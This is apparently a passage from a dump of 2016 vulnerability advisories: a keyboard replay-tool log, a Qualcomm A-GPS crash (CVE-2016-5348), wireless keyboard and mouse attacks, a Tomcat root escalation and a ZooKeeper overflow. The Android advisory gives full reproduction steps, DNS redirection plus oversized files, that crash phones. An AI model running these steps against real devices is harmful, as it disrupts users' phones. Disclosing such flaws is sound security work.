[+] Send data: 083816016634008a
[+] Send data: 09981601653e89ebf7499ce2b7f962e9da48c5f4
[+] Send data: 09981601653e89ebf7499ce2b7f962e9da48c5f4
[+] Send data: 09981601f7612ae3b196b5767ab0a4dd615651e2
[+] Send data: 0838160168340084
[+] Send data: 0838160168340084
[+] Send data: 09981601db67b32134efa3fefd8b01efb124581d
[+] Send data: 09981601db67b32134efa3fefd8b01efb124581d
[*] Press <ENTER> to replay the recorded data packets or <CTRL+C> to quit ...^C
[*] Stop replaying
[*] Done.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The SySS GmbH is not aware of a solution for this reported security
vulnerability.
For further information please contact the manufacturer.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-05-19: Vulnerability reported to manufacturer
2016-05-19: Manufacturer acknowledges e-mail with SySS security advisory
2016-06-06: E-mail to manufacturer according current status
2016-06-27: Another e-mail to manufacturer according current status
2016-06-27: E-mail from manufacturer requesting further information
2016-06-28: Provided further information and PoC software tool
2016-07-07: E-mail from manufacturer with further information and
question about intended disclosure
2016-07-08: E-mail to manufacturer concerning the planned responsible
disclosure
2016-08-04: E-mail from manufacturer concerning limitations of actual
attacks
2016-10-05: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Microsoft Wireless Desktop 2000
https://www.microsoft.com/accessories/en-us/products/keyboards/wireless-desktop-2000/m7j-00001
[2] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[3] SySS Security Advisory SYSS-2016-043
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-043.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg and Gerhard
Klostermeier of the SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJX9L/fAAoJENmkv2o0rU2riMQQAJA1pgZi1y6ojVO/yXkQHTfU
TSK/4+8kkkl0VirV6jmc+nfhRD8FP7/d9ZRQUgR7jkehva5/9gonY5k3cWFfLni0
L+3uLON3Ca96yKs6u6LG8AfSaeNUIvHRIQq+WzC8GtmJJGtsKGqXK687Q76Ni1e9
XKlmm0bFEhaTq3j2fZ8QMoi5ec4+ObMs0cJDmRyObFz3umGikn5fDp+0h98GOqfj
FAqfYD378VYfcFaWtA3sOnZw3vVVjsYHOnAIdtlQpohXbJApf83TTCp4oWdjZTZS
Fd0fgQrX2tcE993eOAo/95tIYlO4RXJiXuOFJdcf448zXlmz8zD/8YftL0t/Q/Bm
cL//sB5BcFxUFuZFrPL6zmjTupf0o9CAZCGPd/fhfdRHEkfmzvyVsSBsB3Cg1Fmf
HY2CTKUAm5Q3Yb3XoxQfoolVqYkT07qAcxngyMxIL3iBLLt0uosnUNJnAc/YB5u/
u7nM3KEtZbR3EyvBDwXU1tqa2FjBaPckzaf5zDYvJ5xCXUtwXy4/DzVaeQJjDl3V
IGYpmRmukHD3VTIkmfZ9AHZeIhdo74qU9YBpQcWP8XjlEcfr/Pk1n2CqOj0ZE4lI
pWJrPwL3NUy54svBhKAI2w0rNgkUlnk5xlVCYYG6TXyYQnqwEFb9vsBZYIWkQf8g
oXDN0lPWQODNhbImepky
=oqk4
-----END PGP SIGNATURE-----"
2380,Crashing Android devices with large Assisted-GPS Data Files [CVE-2016-5348],,CVE-2016-5348,"Original at:
https://wwws.nightwatchcybersecurity.com/2016/10/04/advisory-cve-2016-5348-2/
Summary
Android devices can be crashed remotely forcing a halt and then a soft
reboot by a MITM attacker manipulating assisted GPS/GNSS data provided
by Qualcomm. This issue affects the open source code in AOSP and
proprietary code in a Java XTRA downloader provided by Qualcomm. The
Android issue was fixed by in the October 2016 Android bulletin.
Additional patches have been issued by Qualcomm to the proprietary
client in September of 2016. This issue may also affect other
platforms that use Qualcomm GPS chipsets and consume these files but
that has not been tested by us, and requires further research.
Background – GPS and gpsOneXtra
Most mobile devices today include ability to locate themselves on the
Earth’s surface by using the Global Positioning System (GPS), a system
originally developed and currently maintained by the US military.
Similar systems developed and maintained by other countries exist as
well including Russia’s GLONASS, Europe’s Galileo, and China’s Beidou.
The GPS signals include an almanac which lists orbit and status
information for each of the satellites in the GPS constellation. This
allows the receivers to acquire the satellites quicker since the
receiver would not need to search blindly for the location of each
satellite. Similar functionality exists for other GNSS systems. In
order to solve the problem of almanac acquisition, Qualcomm developed
the gpsOneXtra system in 2007 (also known as IZat XTRA Assistance
since 2013). This system provides ability to GPS receivers to download
the almanac data over the Internet from Qualcomm-operated servers. The
format of these XTRA files is proprietary but seems to contain current
satellite location data plus estimated locations for the next 7 days,
as well as additional information to improve signal acquisition. Most
Qualcomm mobile chipsets and GPS chips include support for this
technology. A related Qualcomm technology called IZat adds ability to
use WiFi and cellular networks for locations in addition to GPS.
Background – Android and gpsOneXtra Data Files
During our network monitoring of traffic originating from an Android
test device, we discovered that the device makes periodic calls to the
Qualcomm servers to retrieve gpsOneXtra assistance files. These
requests were performed almost every time the device connected to a
WiFi network. As discovered by our research and confirmed by the
Android source code, the following URLs were used:
http://xtra1.gpsonextra.net/xtra.bin
http://xtra2.gpsonextra.net/xtra.bin
http://xtra3.gpsonextra.net/xtra.bin
http://xtrapath1.izatcloud.net/xtra2.bin
http://xtrapath2.izatcloud.net/xtra2.bin
http://xtrapath3.izatcloud.net/xtra2.bin
WHOIS record show that both domains – gpsonextra.net and izatcloud.net
are owned by Qualcomm. Further inspection of those URLs indicate that
both domains are being hosted and served from Amazon’s Cloudfront CDN
service (with the exception of xtra1.gpsonextra.net which is being
served directly by Qualcomm). On the Android platform, our inspection
of the Android source code shows that the file is requested by an
OS-level Java process (GpsXtraDownloader.java), which passes the data
to a C++ JNI class
(com_android_server_location_GnssLocationProvider.cpp), which then
injects the files into the Qualcomm modem or firmware. We have not
inspected other platforms in detail, but suspect that a similar
process is used. Our testing was performed on Android v6.0, patch
level of January 2016, on a Motorola Moto G (2nd gen) GSM phone, and
confirmed on a Nexus 6P running Android v6.01, with May 2016 security
patches. Qualcomm has additionally performed testing on their
proprietary Java XTRA downloader client confirming this vulnerability.
Vulnerability Details
Android platform downloads XTRA data files automatically when
connecting to a new network. This originates from a Java class
(GpsXtraDownloader.java), which then passes the file to a C++/JNI
class (com_android_server_location_GnssLocationProvider.cpp) and then
injects it into the Qualcomm modem.
The vulnerability is that both the Java and the C++ code do not check
how large the data file actually is. If a file is served that is
larger than the memory available on the device, this results in all
memory being exhausted and the phone halting and then soft rebooting.
The soft reboot was sufficient to recover from the crash and no data
was lost. While we have not been able to achieve remote code execution
in either the Qualcomm modem or in the Android OS, this code path can
potentially be exploited for such attacks and would require more
research.
To attack, an MITM attacker located anywhere on the network between
the phone being attacked and Qualcomm’s servers can initiate this
attack by intercepting the legitimate requests from the phone, and
substituting their own, larger files. Because the default Chrome
browser on Android reveals the model and build of the phone (as we
have written about earlier), it would be possible to derive the
maximum memory size from that information and deliver the
appropriately sized attack file. Possible attackers can be hostile
hotspots, hacked routers, or anywhere along the backbone. This is
somewhat mitigated by the fact that the attack file would need to be
as large as the memory on the phone.
The vulnerable code resides here – (GpsXtraDownloader.java, lines 120-127):
connection.connect()
int statusCode = connection.getResponseCode();
if (statusCode != HttpURLConnection.HTTP_OK) {
if (DEBUG) Log.d(TAG, “HTTP error downloading gps XTRA: “ + statusCode);
return null;
}
return Streams.readFully(connection.getInputStream());
Specifically, the affected code is using Streams.readFully to read the
entire file into memory without any kind of checks on how big the file
actually is.
Additional vulnerable code is also in the C++ layer –
(com_android_server_location_GnssLocationProvider.cpp, lines 856-858):
jbyte* bytes = (jbyte *)env->GetPrimitiveArrayCritical(data, 0);
sGpsXtraInterface->inject_xtra_data((char *)bytes, length);
env->ReleasePrimitiveArrayCritical(data, bytes, JNI_ABORT);
Once again, no size checking is done. We were able to consistently
crash several different Android phones via a local WiFi network with
the following error message:
java.lang.OutOfMemoryError: Failed to allocate a 478173740 byte
allocation with 16777216 free bytes and 252MB until OOM
at java.io.ByteArrayOutputStream.expand(ByteArrayOutputStream.java:91)
(It should be noted that we were not able to consistently and reliable
achieve a crash in the C++/JNI layer or the Qualcomm modem itself)
Steps To Replicate (on Ubuntu 16.04)
1. Install DNSMASQ:
sudo apt-get install dnsmasq
2. Install NGINX:
sudo apt-get install nginx
3. Modify the /etc/hosts file to add the following entries to map to
the IP of the local computer (varies by vendor of the phone):
192.168.1.x xtra1.gpsonextra.net
192.168.1.x xtra2.gpsonextra.net
192.168.1.x xtra3.gpsonextra.net
192.168.1.x xtrapath1.izatcloud.net
192.168.1.x xtrapath2.izatcloud.net
192.168.1.x xtrapath3.izatcloud.net
4. Configure /etc/dnsmasq.conf file to listed on the IP:
listen-address=192.168.1.x
5. Restart DNSMASQ:
sudo /etc/init.d/dnsmasq restart
6. Use fallocate to create the bin files in “/var/www/html/”
sudo fallocate -s 2.5G xtra.bin
sudo fallocate -s 2.5G xtra2.bin
sudo fallocate -s 2.5G xtra3.bin
7. Modify the settings on the Android test phone to static, set DNS to
point to “192.168.1.x”. AT THIS POINT – Android will resolve DNS
against the local computer, and serve the GPS files from it.
To trigger the GPS download, disable WiFi and enable Wifi, or
enable/disable Airplane mode. Once the phone starts downloading the
files, the screen will go black and it will reboot.
PLEASE NOTE: on some models, the XTRA file is cached and not retrieved
on every network connect. For those models, you may need to reboot the
phone and/or follow the injection commands as described here. You can
also use an app like GPS Status and ToolboxGPS Status and Toolbox.
The fix would be to check for file sizes in both Java and native C++ code.
Mitigation Steps
For the Android platform, users should apply the October 2016 Android
security bulletin and any patches provided by Qualcomm. Please note
that as per Qualcomm, the patches for this bug only include fixes to
the Android Open Source Project (AOSP) and the Qualcomm Java XTRA
downloader clients. Apple and Microsoft have indicated to us via email
that GPS-capable devices manufactured by them including iPad, iPhones,
etc. and Microsoft Surface and Windows Phone devices are not affected
by this bug. Blackberry devices powered by Android are affected but
the Blackberry 10 platform is not affected by this bug. For other
platforms, vendors should follow guidance provided by Qualcomm
directly via an OEM bulletin.
Bounty Information
This bug has fulfilled the requirements for Google’s Android Security
Rewards and a bounty has been paid.
References
Android security bulletin: October 2016
CERT/CC tracking: VR-179
CVE-ID: CVE-2016-5348
Google: Android bug # 213747 / AndroidID-29555864
CVE Information
As provided by Qualcomm:
CVE: CVE-2016-5348
Access Vector: Network
Security Risk: High
Vulnerability: CWE-400: Uncontrolled Resource Consumption (‘Resource
Exhaustion’)
Description: When downloading a very large assistance data file, the
client may crash due to out of memory error.
Change summary:
check download size ContentLength before downloading data
catch OOM exception
Credits
We would like to thank CERT/CC for helping to coordinate this process,
and all of the vendors involved for helpful comments and a quick
turnaround. This bug was discovered by Yakov Shafranovich, and the
advisory was also written by Yakov Shafranovich.
Timeline
201606-20: Android bug report filed with Google
2016-06-21: Android bug confirmed
2016-06-21: Bug also reported to Qualcomm and CERT.
2016-09-14: Coordination with Qualcomm on public disclosure
2016-09-15: Coordination with Google on public disclosure
2016-10-03: Android security bulletin released with fix
2016-10-04: Public disclosure"
2381,"[SYSS-2016-068] Fujitsu Wireless Keyboard Set LX901 - Cryptographic Issues (CWE-310), Missing Protection against Replay Attacks",CWE-310,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-068
Product: Wireless Keyboard Set LX901
Manufacturer: Fujitsu
Affected Version(s): Model No. GK900
Tested Version(s): Model No. GK900
Vulnerability Type: Cryptographic Issues (CWE-310)
Missing Protection against Replay Attacks
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2016-07-07
Solution Date: -
Public Disclosure: 2016-10-05
CVE Reference: Not yet assigned
Authors of Advisory: Matthias Deeg and Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Fujitsu Wireless Keyboard Set LX901 is a wireless desktop set consisting
of a mouse and a keyboard.
The manufacturer describes the product as follows (see [1]):
""The Wireless Keyboard LX901 is a top of the line desktop solution
for lifestyle orientated customers, who want only the best for their
desk. This superb keyboard set offers ambitious users more functions,
security and better features than a conventional interface device. It
even includes 2.4 GHz technology and 128 AES encryption for security.""
Due to an insecure implementation of the encrypted data communication,
the wireless keyboard LX901 is vulnerable to replay attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the wireless keyboard Fujitsu LX901 is
prone to replay attacks.
An attacker can sniff the AES-encrypted data packets of the 2.4 GHz
radio communication sent by the keyboard to the receiver (USB dongle)
and replay the recorded communication data at will causing the same
effect as the original data communication.
A replay attack against the keyboard can, for example, be used to gain
unauthorized access to a computer system that is operated with a
vulnerable Fujitsu LX901 keyboard. In this attack scenario, an attacker
records the radio communication during a password-based user
authentication of his or her victim, for instance during a login to the
operating system or during unlocking a screen lock. At an opportune
moment when the victim's computer system is unattended, the attacker
approaches the victim's computer and replays the previously recorded
AES-encrypted data communication for the password-based user
authentication and thereby gets unauthorized access to the victim's
system.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The SySS GmbH could successfully perform a replay attack as described
in the previous section using a software-defined radio in combination
with the software tool GNU Radio Companion.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
According to information from the manufacturer Fujitsu, the reported
security issue will currently not be fixed in affected products.
The written statement in German from Fujitsu regarding this security
issue is as follows:
""Vielen Dank f�r Ihre Informationen zu unserer Funktastatur. Wie Ihnen
bereits mitgeteilt, halten wir das von Ihnen beschriebene
Angriffsszenario bei unserer Tastatur aufgrund des verwendeten
Funkprotokolls unter realen Bedingungen f�r nicht so einfach
durchf�hrbar. Wie erw�hnt, verkaufen wir mit unserer Tastatur keine
Sicherheitsl�sung, sondern eine Komfortl�sung (ohne gravierende
Sicherheitsnachteile wie bei unverschl�sselten Wireless-Tastaturen).
In einem bereits geplanten Nachfolgeprodukt werden alle neuen
Erkenntnisse zur sicheren Daten�bertragung bei Funktastaturen
einflie�en.""
The English translation of this statement is as follows:
""Thank you very much for your information about our wireless keyboard.
As we have already pointed out, we believe that the described scenario
is not easy to perform under real conditions due to the radio protocol
used. As mentioned, our product is not destined to sell security, but
convenience in the first place (without the security drawbacks of
unencrypted wireless keyboards). Any new information and insights will
be incorporated into the already planned successor product.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-07-07: Vulnerability reported to manufacturer
2016-07-08: Manufacturer acknowledges e-mail with SySS security advisory
2016-08-02: E-mail from manufacturer requesting further information
2016-08-04: Provided further information to manufacturer via e-mail
2016-08-05: E-mail from manufacturer with further questions
2016-08-08: E-mail to manufacturer with answers to open questions
2016-08-12: E-mail from manufacturer with statement regarding the
reported security issue
2016-10-05: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Fujitsu Wireless Keyboard Set
http://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/wl-keyboard-lx901.html
[2] SySS Security Advisory SYSS-2016-068
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-068.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg and Gerhard
Klostermeier of the SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJX9MPdAAoJENmkv2o0rU2rYSMP/i0VFjxP094ZXY13wjEhTMw6
FMw27uLkw4oN86iYUKAyw3ulprTtDvhs+eXfwH9y9bZXGPvZOb5QzvTGu/Yy8CVQ
ed5p0n/a0zfa+4MBTmtRap/7tIQkXuOXXoQPGyu3mSHP87rJKCq81E0sRxGOd7C9
tLhvfFEXKPiLwo9eDObpWNcy28U/b31W7Yqdj87mYQ6xMuBWVkkTR2W6CM7oU1D1
B2sY7zFsPpEttypGRkGjEP9WNU95B+i0PdL6vBWq1xXh+9QJn5QmwpdY+c0oKInv
t8wWiRdCDDfBscq31F5cLngGCwihAcandc4nxf7F2egWw5pay9bHPzF3AqplqB7L
HFtQ8FMf5oukt6j4YddXp1FIdtct7Y/RIlisbIyJQzP7B7HYb6Adep8kurd+K7Up
qRlfk6Mx6c+eQvZQlM+y0QF2m63PRUmy5tRS/sSM2FbOWrczcsioZoBqHHUBuvxh
lku77LB6L7rc/Oex640LhhvhnbJKzpX3mrdpKZX442Ugrbz8sQz8Y9wVdCu53hGR
EwyUBW3WHcHCs565dVdQgnsQbIs47gL4vqIChMjsoSaG9JvmZuYf8taY0r7p6Kta
qI/OxU0rawowL4xiK0xDOMySiBxyuHacL6Wg5LI+aHpKwVXQp8QIsMKKmexfgmOQ
UUNiEnPRhMW3EgsFhTY7
=HLOb
-----END PGP SIGNATURE-----"
2401,CVE-2016-1240 - Tomcat packaging on Debian-based distros - Local Root Privilege Escalation,,CVE-2016-1240,"CVE: CVE-2016-1240
Vulnerability: Tomcat packaging on Debian-based distros - Local Root
Privilege Escalation
Affected packages: Tomcat 6/7/8 deb packages (up to 8.0.36-2)
Systems affected: Debian & Ubuntu & possibly others (using the
affected deb packages)
Discovered by:
Dawid Golunski (http://legalhackers.com)
Tomcat (6, 7, 8) packages provided by default repositories on Debian-based
distributions (including Debian, Ubuntu etc.) provide a vulnerable
tomcat init script that allows local attackers who have already gained access
to the tomcat account (for example, by exploiting an RCE vulnerability
in a java web application hosted on Tomcat, uploading a webshell etc.) to
escalate their privileges from tomcat user to root and fully compromise the
target system.
The full Advisory and a PoC exploit can be found at:
http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
--
Regards,
Dawid Golunski
http://legalhackers.com"
2403,[SYSS-2016-060] Logitech M520 - Insufficient Verification of Data Authenticity (CWE-345),CWE-345,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-060
Product: M520 (Mouse of Wireless Combo MK520)
Manufacturer: Logitech
Affected Version(s): Model Y-R0012
Tested Version(s): Model Y-R0012
Vulnerability Type: Insufficient Verification of Data Authenticity (CWE-345)
Mouse Spoofing Attack
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2016-06-28
Solution Date: -
Public Disclosure: 2016-09-30
CVE Reference: Not yet assigned
Authors of Advisory: Matthias Deeg and Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Logitech Wireless Combo MK520 is a wireless desktop set consisting of a
mouse and a keyboard.
The manufacturer describes the product as follows (see [1]):
""A keyboard and mouse that puts convenience and control comfortably at
your fingertips""
Due to unencrypted and unauthenticated mouse data communication, the
wireless desktop set Logitech Wireless Combo MK520 is prone to mouse
spoofing attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the mouse of the wireless desktop set
Logitech Wireless Combo MK520 is prone to spoofing attacks, as the mouse
data communication is unencrypted and unauthenticated.
An attacker can analyze the unencrypted mouse data packets of the 2.4
GHz radio communication sent by the mouse to the receiver (USB dongle)
in order to learn the used protocol. By knowing the used mouse data
protocol, it is possible to spoof mouse actions like mouse movements or
mouse clicks by sending forged data packets.
Thus, an attacker is able to remotely control the mouse pointer of a
target system that is operated with the wireless desktop set Logitech
Wireless Combo MK520. If the graphical user interface of the victim's
system is unlocked, an attacker can for example send a list of mouse
actions that start the virtual on-screen keyboard of the operating
system and execute arbitrary commands in the context of the currently
logged in user, for instance a download and execute attack vector.
As the attacker may not have an unobstructed view to the target system's
screen and may not know the used operating system, the screen resolution,
or the current mouse settings, this kind mouse spoofing attack is based
on heuristics. But concerning an unlocked and unattended system, an
attacker can simply try different attack vectors for different target
system configurations sequentially.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The SySS GmbH could successfully perform mouse spoofing attacks against
a target system operated with the wireless desktop set Logitech Wireless
Combo MK520 using an in-house developed software tool in combination
with the USB radio dongle Crazyradio PA (see [2]).
A proof-of-concept mouse spoofing attack resulting in remote code
execution using the SySS software tool Radioactive Mouse is demonstrated
in a video (see [4]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The SySS GmbH is not aware of a solution for this reported security
vulnerability.
For further information please contact the manufacturer.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-06-28: Vulnerability reported to manufacturer
2016-09-30: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Logitech Wireless Combo MK520
http://www.logitech.com/en-us/product/wireless-combo-mk520
[2] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[3] SySS Security Advisory SYSS-2016-060
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-060.txt
[4] SySS Proof-of-Concept Mouse Spoofing Attack Video
https://www.youtube.com/watch?v=PkR8EODee44
[5] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg and Gerhard
Klostermeier of the SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJX7imSAAoJENmkv2o0rU2rDnUP/ApUOL4tQp46/PO1hsR/VNkq
UcelXWChNMahJ0R+VX1Dbxj+R785egB4L3hwlEvk8I1lVuTj2iKDsHplIlBK/hof
LydV7x1hSoW15XZE5asho1EZ0PcSw6KCICvHbCqfYxB/uQYJnCztZUOpbbeOBPlj
iymJgZD5LVvgPqO2eljCS1vWbIFsopO8ioP56cVLVqQUJl6GppW3zZF1A8QEe6mZ
hDVZYpix9c++6WuM96ePCU5jPcoynndUrkkLLpVb7Wb82qgWGaiRByB8AitFGNm/
DrH1QXasY1wHQPElhf8BPlzUCoe2KBAXuJeqmzbgwW8i+4cyU5rYEqBXjUfEJgHM
HzkCYKsnO7GKO9ReVXJOJ4qiw4yJhniuOcTIaOpVNI9zAmu6iIF2l++0f22uAIl2
Zef32Ti9jAxQkBt+jucXQTg0V3tlSFsTNf79CQb8ta/0ybQQ0mN9wXXIMEZbcRSj
oKj+k2OAvSOCl6RB0CkAdccT+yOxULM7ULOi7F0YJvfaGAH4+mOYdSUUFpXypc+G
jL+oCVth6qhgy0DVftIPPBZRwwotY2pngOEo01xDdvo5nMalPz7N0zy3NOOJIea1
Mz/PYxY5ojzcY6qO4WgJnkEoCnw43UOLwIApni1hKiOTflqhfTRjSazmn5Imn5ve
SB5H//zeiK+A6Upg6I6o
=6m2e
-----END PGP SIGNATURE-----"
2447,[SECURITY] CVE-2016-5017: Buffer overflow vulnerability in ZooKeeper C cli shell,,CVE-2016-5017,"############################################################
CVE-2016-5017: Buffer overflow vulnerability in ZooKeeper C cli shell
Severity: moderate
Vendor:
The Apache Software Foundation
Versions Affected:
ZooKeeper 3.4.0 to 3.4.8
ZooKeeper 3.5.0 to 3.5.2
The unsupported ZooKeeper 1.x through 3.3.x versions may be also affected
Note: The 3.5 branch is still alpha at this time.
Description:
The ZooKeeper C client shells ""cli_st"" and ""cli_mt"" have a buffer
overflow vulnerability associated with parsing of the input command
when using the ""cmd:<cmd>"" batch mode syntax. If the command string
exceeds 1024 characters a buffer overflow will occur. There is no
known compromise which takes advantage of this vulnerability, and if
security is enabled the attacker would be limited by client level
security constraints. The C cli shell is intended as a sample/example
of how to use the C client interface, not as a production tool - the
documentation has also been clarified on this point.
Mitigation:
It is important to use the fully featured/supported Java cli shell rather
than the C cli shell independent of version.
- ZooKeeper 3.4.x users should upgrade to 3.4.9 or apply this patch:
https://git-wip-us.apache.org/repos/asf?p=zookeeper.git;a=commitdiff;h=27ecf981a15554dc8e64a28630af7a5c9e2bdf4f
- ZooKeeper 3.5.x users should upgrade to 3.5.3 when released or apply
this patch:
https://git-wip-us.apache.org/repos/asf?p=zookeeper.git;a=commitdiff;h=f09154d6648eeb4ec5e1ac8a2bacbd2f8c87c14a
The patch solves the problem reported here, but it does not make the
client ready for production use. The community has no plan to make
this client production ready at this time, and strongly recommends that
users move to the Java cli and use the C cli for illustration purposes only.
Credit:
This issue was discovered by Lyon Yang, an Apple security researcher.
References:
https://zookeeper.apache.org/security.html
############################################################"
2452,Insecure transmission of data in Android applications developed with Adobe AIR [CVE-2016-6936],,CVE-2016-6936,"Original at:
https://wwws.nightwatchcybersecurity.com/2016/09/14/advisory-insecure-transmission-of-data-in-android-applications-developed-with-adobe-air-cve-2016-6936/
Summary
Android applications developed with Adobe AIR send data back to Adobe servers without HTTPS while running. This can allow an attacker to compromise the privacy of the applications� users. This has been fixed in Adobe AIR SDK release v23.0.0.257.
Details
Adobe AIR is a developer product which allows the same application code to be compiled and run across multiple desktop and mobile platforms. While monitoring network traffic during testing of several Android applications we observed network traffic over HTTP without the use of SSL going to several Adobe servers including the following:
- airdownload2.adobe.com
- mobiledl.adobe.com
